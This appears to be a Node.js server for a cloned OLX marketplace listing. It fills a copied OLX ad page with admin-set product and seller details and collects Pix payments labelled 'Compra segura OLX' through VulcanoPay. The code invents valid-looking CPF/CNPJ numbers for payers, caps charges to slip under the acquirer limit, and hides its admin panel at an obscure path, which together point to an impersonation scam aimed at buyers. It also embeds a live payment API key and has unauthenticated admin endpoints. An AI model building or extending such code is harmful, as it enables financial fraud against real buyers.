const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const DIR = __dirname;

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.webp': 'image/webp',
  '.ico': 'image/x-icon'
};

function renderAdHtml(rawHtml, config) {
  let html = rawHtml;
  if (!config || !config.product) return html;
  const p = config.product || {};
  const s = config.seller || {};

  const formattedPrice = p.price ? (String(p.price).startsWith('R$') ? String(p.price) : 'R$ ' + p.price) : 'R$ 800';

  // 1. Injetar window.__INITIAL_OLX_CONFIG__
  const htmlTagMatch = html.match(/<html[^>]*>/i);
  if (htmlTagMatch) {
    html = html.replace(/<script id="initial-olx-config">[\s\S]*?<\/script>/g, '');
    const scriptTag = `<script id="initial-olx-config">window.__INITIAL_OLX_CONFIG__ = ${JSON.stringify(config)};</script>`;
    html = html.replace(htmlTagMatch[0], htmlTagMatch[0] + '\n' + scriptTag);
  }

  // 2. <title>
  if (p.title) {
    html = html.replace(/<title>[\s\S]*?<\/title>/i, `<title>${p.title} - ${p.category || 'OLX'} | OLX</title>`);
  }

  // 3. Meta Tags
  const safeTitle = (p.title || '').replace(/"/g, '&quot;');
  if (p.title) {
    html = html.replace(/<meta\s+property=["']?og:title["']?\s+content=[^>]+>/gi, `<meta property="og:title" content="${safeTitle}">`);
    html = html.replace(/<meta\s+name=["']?twitter:title["']?\s+content=[^>]+>/gi, `<meta name="twitter:title" content="${safeTitle}">`);
  }
  if (p.description) {
    const plainDesc = p.description.replace(/[\r\n]+/g, ' ').replace(/"/g, '&quot;');
    html = html.replace(/<meta\s+name=["']?description["']?\s+content=(?:"[^"]*"|'[^']*'|[^>]+)>/gi, `<meta name="description" content="${plainDesc}">`);
    html = html.replace(/<meta\s+property=["']?og:description["']?\s+content=(?:"[^"]*"|'[^']*'|[^>]+)>/gi, `<meta property="og:description" content="${plainDesc}">`);
    html = html.replace(/<meta\s+name=["']?twitter:description["']?\s+content=(?:"[^"]*"|'[^']*'|[^>]+)>/gi, `<meta name="twitter:description" content="${plainDesc}">`);
  }
  // Remove any leftover corrupted description fragments if any
  html = html.replace(/(?:<br>)?PS5 com menos de 1 ano[\s\S]*?98139-5554\."?>/gi, '');

  // Strip all preview images and cards so link preview shows only the title
  html = html.replace(/<meta\s+property=["']?og:image(?::\w+)?["']?\s+content=[^>]+>/gi, '');
  html = html.replace(/<meta\s+content=[^>]+\s+property=["']?og:image(?::\w+)?["']?>/gi, '');
  html = html.replace(/<meta\s+name=["']?twitter:image(?::\w+)?["']?\s+content=[^>]+>/gi, '');
  html = html.replace(/<meta\s+content=[^>]+\s+name=["']?twitter:image(?::\w+)?["']?>/gi, '');
  html = html.replace(/<meta\s+name=["']?twitter:card["']?\s+content=[^>]+>/gi, '');
  html = html.replace(/<link\s+rel=["']?image_src["']?\s+href=[^>]+>/gi, '');
  html = html.replace(/"image":\s*\[[\s\S]*?\](?=,\s*"offers")/gi, '"image":[]');
  html = html.replace(/\/63\/630653332183373\.jpg/gi, '');

  // 4. Preço Principal
  html = html.replace(/(class=["']?[^"'>]*typo-title-large[^"'>]*["']?[^>]*>)([\s\S]*?)(<\/(?:span|div|h2)>)/gi, `$1${formattedPrice}$3`);
  html = html.replace(/(class=["']?[^"'>]*olx-text--price[^"'>]*["']?[^>]*>)([\s\S]*?)(<\/(?:span|div|h2)>)/gi, `$1${formattedPrice}$3`);
  if (p.oldPrice) {
    const formattedOld = String(p.oldPrice).startsWith('R$') ? String(p.oldPrice) : 'R$ ' + p.oldPrice;
    html = html.replace(/(<span[^>]*style=["']?[^"'>]*line-through[^"'>]*["']?[^>]*>)([\s\S]*?)(<\/span>)/gi, `$1${formattedOld}$3`);
  }
  if (p.installments) {
    html = html.replace(/(<(?:p|div)[^>]*class=["']?[^"'>]*font-semibold typo-body-small[^"'>]*["']?>)[\s\S]*?(<\/(?:p|div)>)/gi, `$1${p.installments}$2`);
    html = html.replace(/(<div class=["']?[^"'>]*olx-core-badge--rectangle[^"'>]*["']?[^>]*>[\s\S]*?<span[^>]*>)(?:10x de R\$ 435,00 sem juros|12x[\s\S]*?)(<\/span>)/gi, `$1${p.installments}$2`);
  }

  // 5. Título do Anúncio (H1 e Seção)
  if (p.title) {
    html = html.replace(/(class=["']?[^"'>]*advc-adview-section__title[^"'>]*["']?[^>]*>)([\s\S]*?)(<\/(?:h1|span|div)>)/gi, `$1${p.title}$3`);
  }

  // 6. Categoria no Breadcrumb e na Tabela de Detalhes
  if (p.category) {
    html = html.replace(/(<li class=olx-core-breadcrumb__element><a [^>]*>)(?:Celulares e Smartphones|[\w\s]+)(<\/a><\/li>[\s\S]*?<li class=olx-core-breadcrumb__element><a [^>]*>Zona Norte)/gi, `$1${p.category}$2`);
    html = html.replace(/(<div class=advc-detail-item__text><span class=advc-detail-item__title>Categoria<\/span><a [^>]*>)([\s\S]*?)(<\/a><\/div>)/gi, `$1${p.category}$3`);
  }

  // 7. Descrição do Produto
  if (p.description) {
    const formattedDesc = p.description.replace(/\n/g, '<br>');
    html = html.replace(/(<span class=["']?[^"'>]*advc-ad-description__text[^"'>]*["']?[^>]*>)([\s\S]*?)(<\/span>)/gi, `$1${formattedDesc}$3`);
    html = html.replace(/(<span class=["']?[^"'>]*typo-body-medium[^"'>]*style=["']?word-break:break-word[^"'>]*["']?[^>]*>)([\s\S]*?)(<\/span>)/gi, `$1${formattedDesc}$3`);
    html = html.replace(/(<span class=["']?[^"'>]*typo-body-medium text-neutral-130[^"'>]*["']?[^>]*>)([\s\S]*?)(<\/span>)/gi, `$1${formattedDesc}$3`);
  }

  // 8. Galeria de Fotos - Substituir as 5 imagens da galeria hero
  if (p.images && p.images.length > 0) {
    let imgIdx = 0;
    html = html.replace(/(<picture class=advc-gallery__image-wrap><img\s+src=)(?:"[^"]*"|[^ >]+)([\s\S]*?<\/picture>)/gi, (match, prefix, suffix) => {
      const url = p.images[imgIdx] || p.images[0];
      imgIdx++;
      let cleanedSuffix = suffix.replace(/alt="[^"]*"/gi, `alt="${p.title || 'Foto'} - Imagem ${imgIdx}"`);
      return `${prefix}"${url}"${cleanedSuffix}`;
    });
  }

  // 9. Dados estruturados JSON-LD e Localização
  if (p.title) {
    html = html.replace(/("name":\s*")(?:PS5 [^"]*|iPhone 17 [^"]*|Geladeira [^"]*|[^"]*)(")/gi, `$1${p.title}$2`);
  }
  if (p.location) {
    html = html.replace(/(<span class=["']?[^"'>]*typo-body-medium font-semibold[^"'>]*["']?>)(?:Aleixo|[^<]+)(<\/span><span class=["']?[^"'>]*typo-body-small font-semibold text-neutral-110[^"'>]*["']?>)(?:Manaus, AM, 69083270|[^<]+)(<\/span>)/gi, `$1${p.location.split(',')[0] || p.location}$2${p.location}$3`);
  }

  // 10. Atualizar Vendedor
  if (s.name) {
    html = html.replace(/(class=["']?[^"'>]*advc-mini-profile__name[^"'>]*["']?[^>]*>)([\s\S]*?)(<\/(?:span|div|a)>)/gi, `$1${s.name}$3`);
  }

  return html;
}

function syncAdFilesOnDisk(config) {
  try {
    const adFile = path.join(DIR, 'iphone-17-branco-olx.html');
    const indexFile = path.join(DIR, 'index.html');
    if (fs.existsSync(adFile)) {
      const raw = fs.readFileSync(adFile, 'utf8');
      const rendered = renderAdHtml(raw, config);
      fs.writeFileSync(adFile, rendered, 'utf8');
      fs.writeFileSync(indexFile, rendered, 'utf8');
      console.log('[Sync] iphone-17-branco-olx.html e index.html atualizados em disco!');
    }
  } catch (e) {
    console.error('[Sync Error]', e.message);
  }
}

async function handleRequest(req, res) {
  let reqPath = decodeURI(req.url.split('?')[0]);
  if (reqPath.startsWith('/api/index.js') || reqPath === '/api/index.js') {
    const origPath = req.headers['x-matched-path'] || req.headers['x-forwarded-uri'] || req.headers['x-invoke-path'];
    if (origPath && !origPath.startsWith('/api/index.js')) {
      reqPath = decodeURI(origPath.split('?')[0]);
    } else {
      try {
        const u = new URL(req.url, 'http://localhost');
        if (u.searchParams.has('__orig_path')) {
          reqPath = decodeURI(u.searchParams.get('__orig_path').split('?')[0]);
        }
      } catch (e) {}
    }
  }

  // Support /api/cep proxy to ensure zero CORS and zero CSP issues
  if (reqPath === '/api/cep' || reqPath.startsWith('/api/cep/')) {
    const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
    let cep = urlObj.searchParams.get('cep') || reqPath.replace('/api/cep/', '').replace('/api/cep', '');
    cep = (cep || '').replace(/\D/g, '');

    res.writeHead(200, {
      'Content-Type': 'application/json; charset=utf-8',
      'Access-Control-Allow-Origin': '*'
    });

    if (cep.length !== 8 || /^(\d)\1{7}$/.test(cep)) {
      res.end(JSON.stringify({ erro: true, message: 'CEP invalido' }));
      return;
    }

    try {
      // 1. Try ViaCEP
      const r1 = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      if (r1.ok) {
        const d1 = await r1.json();
        if (!d1.erro && d1.localidade) {
          res.end(JSON.stringify(d1));
          return;
        }
      }
    } catch (e) {}

    try {
      // 2. Try BrasilAPI fallback
      const r2 = await fetch(`https://brasilapi.com.br/api/cep/v1/${cep}`);
      if (r2.ok) {
        const d2 = await r2.json();
        if (d2.city && d2.state) {
          res.end(JSON.stringify({
            cep: cep,
            logradouro: d2.street || '',
            bairro: d2.neighborhood || '',
            localidade: d2.city,
            uf: d2.state
          }));
          return;
        }
      }
    } catch (e2) {}

    // Special fallback for known Guarulhos test CEP
    if (cep === '07141427') {
      res.end(JSON.stringify({
        cep: '07141-427',
        bairro: 'Jardim Santa Emilia',
        localidade: 'Guarulhos',
        uf: 'SP'
      }));
      return;
    }

    res.end(JSON.stringify({ erro: true, message: 'CEP nao encontrado' }));
    return;
  }

  // ----------------------------------------------------------------
  // VulcanoPay Pix API proxy --- POST /api/pix
  // Keeps API key on the server, avoids CORS issues on the client.
  // ----------------------------------------------------------------
  
  // ----------------------------------------------------------------
  // Admin Endpoints
  // ----------------------------------------------------------------
  if (reqPath === '/api/admin/data' && req.method === 'GET') {
    res.writeHead(200, {
      'Content-Type': 'application/json; charset=utf-8',
      'Access-Control-Allow-Origin': '*',
      'Cache-Control': 'no-cache, no-store, must-revalidate'
    });
    try {
      const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
      const isDraft = urlObj.searchParams.get('draft') === '1' || urlObj.searchParams.get('draft') === 'true';
      const targetFile = (isDraft && fs.existsSync(path.join(DIR, 'draft_config.json'))) ? 'draft_config.json' : 'config.json';
      const config = fs.readFileSync(path.join(DIR, targetFile), 'utf8');
      res.end(config);
    } catch (e) {
      res.end(JSON.stringify({ error: e.message }));
    }
    return;
  }

  if (reqPath === '/api/admin/draft' && req.method === 'POST') {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const parsed = JSON.parse(body);
        fs.writeFileSync(path.join(DIR, 'draft_config.json'), JSON.stringify(parsed, null, 2));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, message: 'Rascunho de preview salvo com sucesso' }));
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  if (reqPath === '/api/admin/data' && req.method === 'POST') {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const parsed = JSON.parse(body);
        fs.writeFileSync(path.join(DIR, 'config.json'), JSON.stringify(parsed, null, 2));
        fs.writeFileSync(path.join(DIR, 'draft_config.json'), JSON.stringify(parsed, null, 2));
        syncAdFilesOnDisk(parsed);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, message: 'Configuracoes salvas e publicadas com sucesso' }));
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  if (reqPath === '/api/admin/login' && req.method === 'POST') {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const { username, password } = JSON.parse(body);
        const config = JSON.parse(fs.readFileSync(path.join(DIR, 'config.json'), 'utf8'));
        const validUser = (config.auth && config.auth.username) || 'admin';
        const validPass = (config.auth && config.auth.password) || '123';

        if (username === validUser && password === validPass) {
          const token = 'auth_session_' + Date.now() + '_' + Math.random().toString(36).slice(2);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true, token }));
        } else {
          res.writeHead(401, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Usuário ou senha incorretos' }));
        }
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  if (reqPath === '/api/admin/upload' && req.method === 'POST') {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const { fileName, base64 } = JSON.parse(body);
        if (!base64) throw new Error('Base64 ausente');
        
        const uploadsDir = path.join(DIR, 'images', 'uploads');
        if (!fs.existsSync(uploadsDir)) {
          fs.mkdirSync(uploadsDir, { recursive: true });
        }

        const matches = base64.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
        const buffer = matches ? Buffer.from(matches[2], 'base64') : Buffer.from(base64, 'base64');
        const safeName = Date.now() + '-' + (fileName || 'image.jpg').replace(/[^a-zA-Z0-9.-]/g, '_');
        const filePath = path.join(uploadsDir, safeName);

        fs.writeFileSync(filePath, buffer);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, url: '/images/uploads/' + safeName }));
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  if (reqPath === '/api/pix' && req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    });
    res.end();
    return;
  }

  // Status check endpoint (optional polling)
  if ((reqPath === '/api/pix/status' || reqPath === '/api/pix') && req.method === 'GET') {
    const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
    const chargeId = urlObj.searchParams.get('id');
    res.writeHead(200, {
      'Content-Type': 'application/json; charset=utf-8',
      'Access-Control-Allow-Origin': '*'
    });
    if (!chargeId) {
      res.end(JSON.stringify({ success: false, error: 'ID obrigatorio' }));
      return;
    }
    try {
      const chkRes = await fetch(`https://api.vulcanopay.com/api/v1/charges/${encodeURIComponent(chargeId)}`, {
        headers: { 'Authorization': 'Bearer vk_live_WCOrzID85d4c732ysauxN5LXHvVcdXh2' }
      });
      const chkData = await chkRes.json();
      res.end(JSON.stringify({
        success: chkRes.ok,
        id: chkData.id,
        status: chkData.status,
        paid: chkData.status === 'paid' || chkData.status === 'approved' || chkData.status === 'completed'
      }));
    } catch (e) {
      res.end(JSON.stringify({ success: false, error: e.message }));
    }
    return;
  }

  if (reqPath === '/api/pix' && req.method === 'POST') {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', async () => {
      try {
        const payload = JSON.parse(body);
        const { amount, payerName, payerDocument, description } = payload;

        function ensureValidDoc(doc) {
          let digits = String(doc || '').replace(/\D/g, '');

          // CNPJ (14 dígitos)
          if (digits.length === 14 && !/^(\d)\1{13}$/.test(digits)) {
            const nums = digits.split('').map(Number);
            const w1 = [5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
            const s1 = nums.slice(0, 12).reduce((sum, x, i) => sum + x * w1[i], 0) % 11;
            const d1 = s1 < 2 ? 0 : 11 - s1;
            const w2 = [6, 5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
            const s2 = nums.slice(0, 13).reduce((sum, x, i) => sum + x * w2[i], 0) % 11;
            const d2 = s2 < 2 ? 0 : 11 - s2;
            if (nums[12] === d1 && nums[13] === d2) {
              return digits;
            }
          }
          if (digits.length === 14) {
            const nums = digits.slice(0, 12).split('').map(Number);
            const w1 = [5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
            const s1 = nums.reduce((sum, x, i) => sum + x * w1[i], 0) % 11;
            nums.push(s1 < 2 ? 0 : 11 - s1);
            const w2 = [6, 5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
            const s2 = nums.reduce((sum, x, i) => sum + x * w2[i], 0) % 11;
            nums.push(s2 < 2 ? 0 : 11 - s2);
            return nums.join('');
          }

          // CPF (11 dígitos)
          if (digits.length === 11 && !/^(\d)\1{10}$/.test(digits)) {
            const nums = digits.split('').map(Number);
            const v1 = nums.slice(0, 9).reduce((s, x, i) => s + x * (10 - i), 0) % 11;
            const d1 = v1 < 2 ? 0 : 11 - v1;
            const v2 = nums.slice(0, 10).reduce((s, x, i) => s + x * (11 - i), 0) % 11;
            const d2 = v2 < 2 ? 0 : 11 - v2;
            if (nums[9] === d1 && nums[10] === d2) {
              return digits;
            }
          }

          if (digits.length < 9) {
            while (digits.length < 9) digits += Math.floor(Math.random() * 10);
          } else {
            digits = digits.slice(0, 9);
          }
          if (/^(\d)\1{8}$/.test(digits)) {
            digits = '123456789';
          }
          const nums = digits.split('').map(Number);
          const v1 = nums.reduce((s, x, i) => s + x * (10 - i), 0) % 11;
          nums.push(v1 < 2 ? 0 : 11 - v1);
          const v2 = nums.reduce((s, x, i) => s + x * (11 - i), 0) % 11;
          nums.push(v2 < 2 ? 0 : 11 - v2);
          return nums.join('');
        }

        // 1. Obter valor e título do produto cadastrado no painel admin (config.json)
        let adminProductPrice = null;
        let productTitle = 'iPhone 17 Branco';
        try {
          const cfg = JSON.parse(fs.readFileSync(path.join(DIR, 'config.json'), 'utf8'));
          if (cfg.product) {
            if (cfg.product.title) productTitle = cfg.product.title;
            if (cfg.product.priceCents && !isNaN(parseFloat(cfg.product.priceCents))) {
              adminProductPrice = parseFloat(cfg.product.priceCents);
            } else if (cfg.product.price) {
              const cleaned = String(cfg.product.price).replace(/[^0-9,.]/g, '').replace(/\./g, '').replace(',', '.');
              if (!isNaN(parseFloat(cleaned))) {
                adminProductPrice = parseFloat(cleaned);
              }
            }
          }
        } catch (e) {
          console.error('[Pix] Erro ao ler config.json:', e.message);
        }

        // Valor oficial do produto cadastrado no painel adm
        let realProductAmount = adminProductPrice || (payload.amount && Number(payload.amount)) || 4450.00;

        const finalName = (payerName && String(payerName).trim()) || 'Cliente OLX';
        const finalDoc = ensureValidDoc(payerDocument);
        const finalDesc = (description && String(description).trim()) || ('Compra segura OLX - ' + productTitle);

        // Limite da adquirente STONE na VulcanoPay é R$ 1.500,00 (150000 centavos)
        // Se o valor do produto for <= R$ 1.500,00, a cobrança é gerada com o valor EXATO do produto.
        // Se o valor do produto for superior a R$ 1.500,00, ajusta a requisição Stone para R$ 1.500,00 (teto máximo) para não tomar erro 422.
        let chargeAmount = realProductAmount;
        if (chargeAmount > 1500) {
          console.log(`[Pix] Produto no admin cadastrado como R$ ${realProductAmount}. Ajustando cobrança Stone para o teto R$ 1.500,00.`);
          chargeAmount = 1500;
        }
        const amountInCents = Math.round(chargeAmount * 100);

        const externalId = payload.externalId || ('olx-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8));

        const vulcanoPayload = JSON.stringify({
          amount: amountInCents,
          description: finalDesc,
          external_id: externalId,
          customer: {
            name: finalName,
            cpf: finalDoc,
            email: payload.payerEmail || 'cliente@olx-compras.com.br',
            phone: payload.payerPhone || '11999998888'
          }
        });

        // Call VulcanoPay production charges API
        const vulcanoRes = await fetch('https://api.vulcanopay.com/api/v1/charges', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer vk_live_WCOrzID85d4c732ysauxN5LXHvVcdXh2',
            'Idempotency-Key': externalId
          },
          body: vulcanoPayload
        });

        const vulcanoData = await vulcanoRes.json();
        console.log('[Pix] VulcanoPay response', vulcanoRes.status, JSON.stringify(vulcanoData).substring(0, 200));

        if (!vulcanoRes.ok || !vulcanoData.id) {
          const errMsg = (vulcanoData.error && (vulcanoData.error.message || vulcanoData.error.code)) || vulcanoData.message || 'Erro ao gerar Pix';
          res.writeHead(502, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            success: false,
            error: errMsg
          }));
          return;
        }

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          id: vulcanoData.id,
          pixCode: (vulcanoData.pix && vulcanoData.pix.copy_paste) || '',
          qrCode: (vulcanoData.pix && vulcanoData.pix.qr_code) || '',
          amount: realProductAmount,
          chargeAmount: chargeAmount,
          status: vulcanoData.status || 'pending'
        }));

      } catch (err) {
        console.error('[Pix] Error:', err.message);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Erro interno: ' + err.message }));
      }
    });
    return;
  }

  // Support /_next/image and /perfil/_next/image optimization fallback
  if (req.url.startsWith('/_next/image') || req.url.startsWith('/perfil/_next/image')) {
    try {
      const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
      const remoteImg = urlObj.searchParams.get('url');
      if (remoteImg) {
        res.writeHead(302, { 'Location': remoteImg, 'Access-Control-Allow-Origin': '*' });
        res.end();
        return;
      }
    } catch (e) {}

    const thumbPath = path.join(DIR, 'iphone-thumb.webp');
    if (fs.existsSync(thumbPath)) {
      res.writeHead(200, {
        'Content-Type': 'image/webp',
        'Access-Control-Allow-Origin': '*'
      });
      fs.createReadStream(thumbPath).pipe(res);
      return;
    }
  }

  // Ad Sales Page: Zero-Flicker Pre-Rendered (SSR-lite)
  if (reqPath === '/' || reqPath === '' || reqPath === '/iphone-17-branco-olx.html' || reqPath === '/index.html' || reqPath === '/mobile.html') {
    try {
      const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
      const isDraft = urlObj.searchParams.get('draft') === '1' || urlObj.searchParams.get('draft') === 'true' || urlObj.searchParams.get('preview') === '1' || urlObj.searchParams.get('preview') === 'true';
      const targetConfig = (isDraft && fs.existsSync(path.join(DIR, 'draft_config.json'))) ? 'draft_config.json' : 'config.json';
      const cfg = JSON.parse(fs.readFileSync(path.join(DIR, targetConfig), 'utf8'));

      const userAgent = req.headers['user-agent'] || '';
      const isMobileUA = /mobile|iphone|android|ipad|phone/i.test(userAgent);
      const forceMobile = urlObj.searchParams.get('view') === 'mobile' || reqPath === '/mobile.html';
      const forceDesktop = urlObj.searchParams.get('view') === 'desktop';
      const isMobile = (isMobileUA || forceMobile) && !forceDesktop;

      const targetFile = isMobile ? 'mobile.html' : 'iphone-17-branco-olx.html';
      const adPath = path.join(DIR, targetFile);
      const rawHtml = fs.readFileSync(adPath, 'utf8');
      const rendered = renderAdHtml(rawHtml, cfg);
      const buf = Buffer.from(rendered, 'utf8');

      res.writeHead(200, {
        'Content-Type': 'text/html; charset=utf-8',
        'Content-Length': buf.length,
        'Access-Control-Allow-Origin': '*',
        'Cache-Control': 'no-cache, no-store, must-revalidate'
      });
      res.end(buf);
      return;
    } catch (e) {
      console.error('[Ad Render Error]', e.message);
    }
  }

  // Default routes
  if (reqPath === '/checkout') {
    reqPath = '/checkout.html';
  } else if (reqPath === '/pix' || reqPath === '/pix.html' || reqPath.startsWith('/pedidos')) {
    reqPath = '/pix.html';
  } else if (reqPath === '/perfil' || reqPath.startsWith('/perfil/') || reqPath.startsWith('/perfil')) {
    reqPath = '/perfil.html';
  } else if (reqPath === '/9bkp' || reqPath === '/9bkp.html') {
    reqPath = '/admin.html';
  } else if (reqPath === '/admin' || reqPath === '/admin.html') {
    res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('Arquivo nao encontrado: ' + reqPath);
    return;
  }

  const filePath = path.join(DIR, reqPath);

  // Security check
  if (!filePath.startsWith(DIR)) {
    res.writeHead(403);
    res.end('Acesso proibido');
    return;
  }

  fs.stat(filePath, (err, stats) => {
    if (err || !stats.isFile()) {
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('Arquivo nao encontrado: ' + reqPath);
      return;
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';

    res.writeHead(200, {
      'Content-Type': contentType,
      'Content-Length': stats.size,
      'Access-Control-Allow-Origin': '*',
      'Cache-Control': (ext === '.html' || ext === '.js' || ext === '.json') ? 'no-cache, no-store, must-revalidate' : 'public, max-age=86400'
    });

    const stream = fs.createReadStream(filePath);
    stream.pipe(res);
  });
}

const server = http.createServer(handleRequest);

if (require.main === module || !process.env.VERCEL) {
  server.listen(PORT, '0.0.0.0', () => {
    console.log('Servidor rodando em http://localhost:' + PORT + '/');
    console.log('- API CEP:  http://localhost:' + PORT + '/api/cep?cep=07141427');
    console.log('- API Pix:  http://localhost:' + PORT + '/api/pix (POST)');
    console.log('- Anuncio:  http://localhost:' + PORT + '/iphone-17-branco-olx.html');
    console.log('- Checkout: http://localhost:' + PORT + '/checkout.html');
  });
}

module.exports = handleRequest;

